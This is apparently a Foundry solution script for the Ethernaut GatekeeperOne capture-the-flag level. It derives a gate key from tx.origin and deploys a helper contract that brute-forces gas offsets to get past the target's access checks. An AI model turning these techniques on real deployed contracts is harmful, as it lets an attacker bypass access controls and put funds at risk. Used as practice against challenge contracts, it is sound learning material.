// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

// Attacker contract to help with gas calculation
contract Attacker {
    function attack(address target, bytes8 key) external {
        // Try different gas offsets
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToSend = 8191 * 3 + i;
            (bool success,) = target.call{gas: gasToSend}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}

contract SolveGatekeeperOne is Script {
    GatekeeperOne public gatekeeperOneContract;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        gatekeeperOneContract = GatekeeperOne(payable(vm.envAddress("GATEKEEPERONE_ADDRESS")));

        // Construct the correct gateKey
        uint16 originLower = uint16(uint160(tx.origin));
        // 0x100000000000XXXX where XXXX is lower 2 bytes of tx.origin
        bytes8 gateKey = bytes8(uint64(uint32(originLower)) | 0x1000000000000000);

        // Deploy attacker contract
        Attacker attacker = new Attacker();

        // Execute attack through the contract
        attacker.attack(address(gatekeeperOneContract), gateKey);

        vm.stopBroadcast();
    }
}
